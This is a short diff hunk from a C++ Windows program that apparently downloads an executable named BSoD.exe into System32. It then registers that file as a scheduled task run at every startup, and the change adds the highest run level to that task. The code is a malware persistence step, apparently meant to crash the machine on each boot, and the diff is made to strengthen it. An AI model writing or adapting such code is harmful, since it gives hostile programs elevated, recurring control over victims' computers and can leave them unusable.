@@ -63,7 +63,7 @@ int main()
 			system("cls");
 			cout << ("Downloaded OK") << endl;
 			SetConsoleTitle(TEXT("Creating task..."));
-			system("SCHTASKS /Create /SC ONSTART /TN BSoD /F /TR C:\\Windows\\System32\\BSoD.exe >>nul");
+			system("SCHTASKS /Create /SC ONSTART /TN BSoD /RL HIGHEST /F /TR C:\\Windows\\System32\\BSoD.exe >>nul");
 			Sleep(1200);
 		}
 		else
